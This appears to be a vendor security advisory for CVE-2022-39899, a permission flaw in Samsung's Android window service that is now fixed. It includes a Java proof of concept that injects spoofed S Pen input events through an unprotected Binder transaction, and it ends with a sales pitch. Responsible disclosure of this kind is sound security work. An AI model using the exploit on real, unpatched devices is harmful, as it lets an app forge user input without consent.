# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.14</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39899">CVE-2022-39899</a> (SVE-2022-1929)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$3480</td>
    </tr>
</table>

# Description

The system service `window` (`android.view.IWindowManager`) was created in AOSP, but was patched in the Samsung Android Framework. In addition, Samsung added the ability to interact with the Samsung S Pen using the `dispatchSPenGestureEvent()` method. It allowed to deliver any event from anywhere on the device's screen. Since it was unprotected and did not check any permissions of the calling app, an attacker could use this method to spoof user gestures.

**Proof of Concept**

This vulnerability is present only on devices that support S Pen (the value of `com.samsung.android.rune.CoreRune.FW_SPEN` should be `true`).

```java
static final int TRANSACTION_dispatchSPenGestureEvent = 165;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("window");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeInt(100);
        parcel.writeInt(100);
        parcel.writeTypedArray(new InputEvent[]{new KeyEvent(1, 23)}, 0);
        parcel.writeStrongBinder(null);

        Parcel reply = Parcel.obtain();
        binder.transact(TRANSACTION_dispatchSPenGestureEvent, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.